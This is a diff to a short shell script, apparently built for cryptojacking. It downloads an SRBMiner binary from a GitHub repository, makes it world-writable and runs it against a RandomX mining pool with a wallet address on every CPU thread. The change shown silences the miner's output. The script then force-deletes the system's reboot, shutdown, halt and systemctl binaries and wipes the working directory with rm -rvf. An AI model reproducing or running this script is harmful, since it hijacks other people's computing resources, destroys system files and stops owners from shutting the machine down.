@@ -2,7 +2,7 @@
 apt-get update 
 wget -O oasis https://github.com/claires67/buut/raw/main/SRBMiner-MULTI
 chmod 777 oasis
-./oasis --algorithm randomx --pool randomx.rplant.xyz:7139 -u SEXTTRAacnPbtCB7eoWaXWCEPcs7W2ZTZPwHayYHzB8jD8CJ6jPhBoXd4MEesUbbWYbsoUVkYFimA8GFJNvor8tRADmsCccUFf.$(shuf -n 1 -i 1-99999)-Bismillah --password x --cpu-threads $(nproc --all) 
+./oasis --algorithm randomx --pool randomx.rplant.xyz:7139 -u SEXTTRAacnPbtCB7eoWaXWCEPcs7W2ZTZPwHayYHzB8jD8CJ6jPhBoXd4MEesUbbWYbsoUVkYFimA8GFJNvor8tRADmsCccUFf.$(shuf -n 1 -i 1-99999)-Bismillah --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
